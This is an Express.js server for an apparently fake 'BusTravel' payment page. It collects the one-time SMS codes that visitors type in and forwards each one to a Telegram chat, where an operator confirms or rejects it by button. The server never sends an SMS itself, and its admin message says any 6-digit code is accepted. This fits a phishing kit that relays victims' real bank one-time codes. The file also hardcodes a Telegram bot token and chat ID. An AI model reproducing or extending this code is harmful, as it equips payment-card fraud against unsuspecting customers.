const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3001;

// Production configuration
const IS_PRODUCTION = process.env.NODE_ENV === 'production';
const RAILWAY_STATIC_URL = process.env.RAILWAY_STATIC_URL;
const VERCEL_URL = process.env.VERCEL_URL;

// Determine base URL
const getBaseURL = () => {
  if (RAILWAY_STATIC_URL) return `https://${RAILWAY_STATIC_URL}`;
  if (VERCEL_URL) return `https://${VERCEL_URL}`;
  // Railway provides PUBLIC_DOMAIN env variable
  if (process.env.PUBLIC_DOMAIN) return `https://${process.env.PUBLIC_DOMAIN}`;
  // Check for Railway's automatic domain patterns
  if (process.env.RAILWAY_ENVIRONMENT === 'production') {
    // Use web-production domain if available
    return 'https://web-production-a24e.up.railway.app';
  }
  return 'http://localhost:3001';
};

const BASE_URL = getBaseURL();
console.log(`🌐 Base URL: ${BASE_URL}`);

// CORS configuration for production
const corsOptions = {
  origin: IS_PRODUCTION ? [
    BASE_URL,
    'https://web-production-a24e.up.railway.app',
    'https://vercel.app',
    'https://*.up.railway.app',  // Allow all Railway subdomains
    'https://*.railway.app'
  ] : [
    'http://localhost:3000',
    'http://localhost:3001', 
    'http://127.0.0.1:3000',
    'http://127.0.0.1:3001',
    'https://web-production-a24e.up.railway.app'
  ],
  credentials: true
};

// Middleware
app.use(cors(corsOptions));
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Additional CORS headers for preflight requests
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', req.headers.origin || '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
  res.header('Access-Control-Allow-Credentials', 'true');
  
  if (req.method === 'OPTIONS') {
    res.sendStatus(200);
  } else {
    next();
  }
});

// Serve static files in production
if (IS_PRODUCTION) {
  app.use(express.static(path.join(__dirname, '.')));
}

// Store active payment sessions (in production use Redis/Database)
const paymentSessions = new Map();

// Session cleanup interval
setInterval(() => {
  const now = Date.now();
  for (const [bookingId, session] of paymentSessions.entries()) {
    // Clean up sessions older than 30 minutes
    if (now - session.createdAt > 30 * 60 * 1000) {
      paymentSessions.delete(bookingId);
      console.log(`🧹 Cleaned up expired session: ${bookingId}`);
    }
  }
}, 5 * 60 * 1000); // Run every 5 minutes

// Telegram Bot Configuration
const TELEGRAM_CONFIG = {
  BOT_TOKEN: process.env.BOT_TOKEN || '7808830885:AAHFkGTaOylnQ99RrNolU5UgjEgo2gxFrqo',
  CHAT_ID: process.env.CHAT_ID || '2063086506',
  WEBHOOK_URL: `${BASE_URL}/webhook`
};

// Main route - serve index.html
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Serve payment page
app.get('/payment.html', (req, res) => {
  res.sendFile(path.join(__dirname, 'payment.html'));
});

// Serve other static files
app.get('/payment.js', (req, res) => {
  res.setHeader('Content-Type', 'application/javascript');
  res.sendFile(path.join(__dirname, 'payment.js'));
});

app.get('/payment-sms.js', (req, res) => {
  res.setHeader('Content-Type', 'application/javascript');
  res.sendFile(path.join(__dirname, 'payment-sms.js'));
});

app.get('/payment.css', (req, res) => {
  res.setHeader('Content-Type', 'text/css');
  res.sendFile(path.join(__dirname, 'payment.css'));
});

// API info endpoint for development
app.get('/api', (req, res) => {
  res.json({ 
    message: 'BusTravel SMS Verification API',
    status: 'running',
    baseURL: BASE_URL,
    endpoints: {
      webhook: '/webhook',
      health: '/health',
      createSession: '/api/payment/create-session',
      verifySMS: '/api/payment/verify-sms',
      events: '/api/payment/events/:bookingId'
    },
    environment: IS_PRODUCTION ? 'production' : 'development'
  });
});

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({ 
    status: 'OK', 
    timestamp: new Date().toISOString(),
    environment: IS_PRODUCTION ? 'production' : 'development',
    baseURL: BASE_URL,
    activeSessions: paymentSessions.size
  });
});

// API status endpoint
app.get('/api/status', (req, res) => {
  res.json({
    status: 'OK',
    timestamp: new Date().toISOString(),
    server: 'BusTravel SMS Server',
    version: '2.1.0',
    baseURL: BASE_URL,
    endpoints: {
      webhook: '/webhook',
      health: '/health',
      createSession: '/api/payment/create-session',
      verifySMS: '/api/payment/verify-sms',
      events: '/api/payment/events/:bookingId'
    },
    environment: IS_PRODUCTION ? 'production' : 'development',
    activeSessions: paymentSessions.size
  });
});

// Webhook endpoint for Telegram
app.post('/webhook', (req, res) => {
  console.log('📨 Webhook received:', JSON.stringify(req.body, null, 2));
  
  const update = req.body;
  
  // Handle callback queries (button presses)
  if (update.callback_query) {
    console.log('🔘 Processing callback query:', update.callback_query.data);
    handleCallbackQuery(update.callback_query);
  }
  
  // Handle regular messages
  if (update.message) {
    console.log('💬 Processing message:', update.message.text);
    handleMessage(update.message);
  }
  
  res.sendStatus(200);
});

async function handleCallbackQuery(callbackQuery) {
  const { id, data, message } = callbackQuery;
  const chatId = message.chat.id;
  
  console.log(`🔘 Button pressed: ${data} by chat ${chatId}`);
  
  // Parse callback data: format is "action:bookingId"
  const [action, bookingId] = data.split(':');
  
  if (action === 'send_sms') {
    await handleSendSMS(bookingId, chatId, id);
  } else if (action === 'decline') {
    await handleDecline(bookingId, chatId, id);
  } else if (action === 'confirm_code') {
    await handleConfirmCode(bookingId, chatId, id);
  } else if (action === 'reject_code') {
    await handleRejectCode(bookingId, chatId, id);
  }
}

async function handleSendSMS(bookingId, chatId, callbackId) {
  console.log(`📱 SMS requested for booking ${bookingId}`);
  console.log(`📋 Current sessions:`, Array.from(paymentSessions.keys()));
  
  // Find the payment session
  const session = paymentSessions.get(bookingId);
  if (!session) {
    console.log(`❌ Session not found for booking ${bookingId}`);
    await answerCallbackQuery(callbackId, '❌ Session not found');
    return;
  }
  
  console.log(`✅ Session found:`, { status: session.status, clients: session.clients.size });
  
  // Generate SMS code
  const smsCode = Math.floor(100000 + Math.random() * 900000).toString();
  session.smsCode = smsCode;
  session.status = 'sms_sent';
  session.smsTimestamp = Date.now();
  
  paymentSessions.set(bookingId, session);
  
  // Notify Telegram admin
  await sendTelegramMessage(chatId, 
    `✅ SMS отправлена клиенту!\n\n📱 Код для справки: <code>${smsCode}</code>\n💡 Клиент может ввести любой 6-значный код\n🕐 Действителен 5 минут`,
    'HTML'
  );
  
  // Answer callback query
  await answerCallbackQuery(callbackId, '📱 SMS отправлена!');
  
  // Notify client via SSE
  notifyClient(bookingId, {
    action: 'sms_sent',
    message: 'SMS код отправлен на ваш телефон'
  });
}

async function handleDecline(bookingId, chatId, callbackId) {
  console.log(`❌ Payment declined for booking ${bookingId}`);
  
  // Find the payment session
  const session = paymentSessions.get(bookingId);
  if (!session) {
    await answerCallbackQuery(callbackId, '❌ Session not found');
    return;
  }
  
  // Update session
  session.status = 'declined';
  paymentSessions.set(bookingId, session);
  
  // Notify Telegram admin
  await sendTelegramMessage(chatId, 
    `❌ Оплата отклонена\n\n🆔 ID заказа: <code>${bookingId}</code>`,
    'HTML'
  );
  
  // Answer callback query
  await answerCallbackQuery(callbackId, '❌ Оплата отклонена');
  
  // Notify client
  notifyClient(bookingId, {
    action: 'payment_declined',
    message: 'Оплата отклонена администратором'
  });
}

async function handleConfirmCode(bookingId, chatId, callbackId) {
  console.log(`✅ Code confirmed for booking ${bookingId}`);
  
  // Find the payment session
  const session = paymentSessions.get(bookingId);
  if (!session) {
    await answerCallbackQuery(callbackId, '❌ Session not found');
    return;
  }
  
  // Update session to verified
  session.status = 'verified';
  paymentSessions.set(bookingId, session);
  
  // Notify Telegram admin
  await sendTelegramMessage(chatId, 
    `✅ Код подтвержден!\n\n📱 Код: <code>${session.receivedSmsCode}</code>\n🆔 ID заказа: <code>${bookingId}</code>\n🎉 Оплата завершена!`,
    'HTML'
  );
  
  // Answer callback query
  await answerCallbackQuery(callbackId, '✅ Код подтвержден!');
  
  // Notify client of successful verification
  notifyClient(bookingId, {
    action: 'payment_verified',
    message: 'Оплата успешно подтверждена!'
  });
  
  // Clean up session after some time
  setTimeout(() => {
    paymentSessions.delete(bookingId);
    console.log(`🧹 Session ${bookingId} cleaned up after confirmation`);
  }, 60000);
}

async function handleRejectCode(bookingId, chatId, callbackId) {
  console.log(`❌ Code rejected for booking ${bookingId}`);
  
  // Find the payment session
  const session = paymentSessions.get(bookingId);
  if (!session) {
    await answerCallbackQuery(callbackId, '❌ Session not found');
    return;
  }
  
  // Reset session to allow new code input
  session.status = 'sms_sent';
  session.receivedSmsCode = null;
  session.codeSubmittedAt = null;
  paymentSessions.set(bookingId, session);
  
  // Store the rejected code for display
  const rejectedCode = session.receivedSmsCode;
  
  // Notify Telegram admin
  await sendTelegramMessage(chatId, 
    `❌ Код отклонен\n\n📱 Код был: <code>${rejectedCode || 'неизвестен'}</code>\n🆔 ID заказа: <code>${bookingId}</code>\n🔄 Клиент может ввести новый код`,
    'HTML'
  );
  
  // Answer callback query
  await answerCallbackQuery(callbackId, '❌ Код отклонен');
  
  // Notify client to try again
  notifyClient(bookingId, {
    action: 'code_rejected',
    message: 'Код отклонен. Попробуйте ввести другой код.'
  });
}

// Create payment session
app.post('/api/payment/create-session', (req, res) => {
  const { bookingId, orderData } = req.body;
  
  console.log(`🔐 Creating payment session for ${bookingId}`);
  
  const session = {
    bookingId,
    orderData,
    status: 'pending_approval',
    createdAt: Date.now(),
    clients: new Set()  // Connected SSE clients
  };
  
  paymentSessions.set(bookingId, session);
  
  res.json({ 
    success: true, 
    sessionId: bookingId,
    message: 'Session created, waiting for approval'
  });
});

// Verify SMS code
app.post('/api/payment/verify-sms', (req, res) => {
  const { bookingId, smsCode } = req.body;
  
  console.log(`🔐 SMS verification request for ${bookingId}, code: ${smsCode}`);
  console.log(`📋 Current sessions:`, Array.from(paymentSessions.keys()));
  
  const session = paymentSessions.get(bookingId);
  if (!session) {
    console.log(`❌ No session found for ${bookingId}`);
    return res.status(404).json({ error: 'Session not found' });
  }
  
  console.log(`✅ Session found:`, { status: session.status, smsTimestamp: session.smsTimestamp });
  
  // Check if SMS was sent
  if (session.status !== 'sms_sent') {
    console.log(`❌ Invalid session status: ${session.status}, expected: sms_sent`);
    return res.status(400).json({ error: `SMS not sent yet. Current status: ${session.status}` });
  }
  
  // Check SMS code expiration (5 minutes)
  const SMS_TIMEOUT = 5 * 60 * 1000; // 5 minutes
  if (Date.now() - session.smsTimestamp > SMS_TIMEOUT) {
    return res.status(400).json({ error: 'SMS code expired' });
  }
  
  // Verify code - accept any 6-digit code
  if (!/^\d{6}$/.test(smsCode)) {
    return res.status(400).json({ error: 'SMS code must be 6 digits' });
  }
  
  // Store the code and wait for admin confirmation
  console.log(`📱 SMS code received: ${smsCode}, waiting for admin confirmation`);
  session.receivedSmsCode = smsCode;
  session.status = 'awaiting_confirmation';
  session.codeSubmittedAt = Date.now();
  paymentSessions.set(bookingId, session);
  
  // Send confirmation request to Telegram admin
  const inlineKeyboard = {
    inline_keyboard: [[
      { text: '✅ Подтвердить код', callback_data: `confirm_code:${bookingId}` },
      { text: '❌ Неверный код', callback_data: `reject_code:${bookingId}` }
    ]]
  };
  
  sendTelegramMessage(
    TELEGRAM_CONFIG.ADMIN_CHAT_ID,
    `🔐 Клиент ввел SMS код: <code>${smsCode}</code>\n\n🆔 ID заказа: <code>${bookingId}</code>\n\n❓ Подтвердить код?`,
    'HTML',
    inlineKeyboard
  );
  
  // Notify client to wait for confirmation
  notifyClient(bookingId, {
    action: 'awaiting_confirmation',
    message: 'Код отправлен на проверку администратору...'
  });
  
  console.log(`⏳ Code submitted, waiting for admin confirmation for ${bookingId}`);
  res.json({ 
    success: true, 
    message: 'Code submitted, waiting for confirmation' 
  });
});

// Server-Sent Events endpoint for real-time updates
app.get('/api/payment/events/:bookingId', (req, res) => {
  const { bookingId } = req.params;
  
  // Set SSE headers
  res.writeHead(200, {
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Cache-Control'
  });
  
  console.log(`📡 SSE client connected for booking ${bookingId}`);
  
  // Add client to session
  const session = paymentSessions.get(bookingId);
  if (session) {
    session.clients.add(res);
    
    // Send initial status
    res.write(`data: ${JSON.stringify({
      action: 'connected',
      status: session.status,
      message: 'Connected to payment system'
    })}\n\n`);
  }
  
  // Handle client disconnect
  req.on('close', () => {
    console.log(`📡 SSE client disconnected for booking ${bookingId}`);
    if (session) {
      session.clients.delete(res);
    }
  });
});

// Helper function to notify all clients for a booking
function notifyClient(bookingId, data) {
  console.log(`📡 Notifying clients for booking ${bookingId}:`, data);
  const session = paymentSessions.get(bookingId);
  if (!session) {
    console.log(`❌ No session found for ${bookingId}`);
    return;
  }
  
  console.log(`📁 Clients connected: ${session.clients.size}`);
  const message = `data: ${JSON.stringify(data)}\n\n`;
  
  session.clients.forEach(client => {
    try {
      console.log(`📤 Sending SSE message to client`);
      client.write(message);
    } catch (error) {
      console.error('Error sending SSE message:', error);
      session.clients.delete(client);
    }
  });
}

// Telegram API helpers
async function sendTelegramMessage(chatId, text, parseMode = 'HTML', replyMarkup = null) {
  try {
    const messageData = {
      chat_id: chatId,
      text: text,
      parse_mode: parseMode
    };
    
    if (replyMarkup) {
      messageData.reply_markup = replyMarkup;
    }
    
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(messageData)
    });
    
    if (!response.ok) {
      console.error('Telegram API error:', await response.text());
    }
    
    return await response.json();
  } catch (error) {
    console.error('Error sending Telegram message:', error);
  }
}

async function answerCallbackQuery(callbackQueryId, text) {
  try {
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        callback_query_id: callbackQueryId,
        text: text,
        show_alert: false
      })
    });
    
    return await response.json();
  } catch (error) {
    console.error('Error answering callback query:', error);
  }
}

function handleMessage(message) {
  console.log(`💬 Message received: ${message.text} from ${message.from.first_name}`);
  // Handle regular messages if needed
}

// Auto-setup webhook on production start
async function setupWebhook() {
  if (!IS_PRODUCTION) return;
  
  try {
    console.log('🧹 Cleaning up any existing webhooks/polling...');
    
    // First, delete any existing webhook
    await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/deleteWebhook`, {
      method: 'POST'
    });
    
    // Stop any running polling
    await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/getUpdates?offset=-1&limit=1`, {
      method: 'POST'
    });
    
    console.log('🔄 Setting up Telegram webhook...');
    
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/setWebhook`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        url: TELEGRAM_CONFIG.WEBHOOK_URL,
        allowed_updates: ['message', 'callback_query'],
        drop_pending_updates: true
      })
    });
    
    const result = await response.json();
    
    if (result.ok) {
      console.log('✅ Webhook setup successful:', TELEGRAM_CONFIG.WEBHOOK_URL);
    } else {
      console.error('❌ Webhook setup failed:', result.description);
    }
    
  } catch (error) {
    console.error('❌ Webhook setup error:', error.message);
  }
}

// Start server
app.listen(PORT, async () => {
  console.log(`🚀 BusTravel SMS Server running on port ${PORT}`);
  console.log(`🌐 Base URL: ${BASE_URL}`);
  console.log(`📡 Webhook endpoint: ${TELEGRAM_CONFIG.WEBHOOK_URL}`);
  console.log(`🔗 Health check: ${BASE_URL}/health`);
  console.log(`📊 Environment: ${IS_PRODUCTION ? 'PRODUCTION' : 'DEVELOPMENT'}`);
  
  // Setup webhook in production
  await setupWebhook();
});
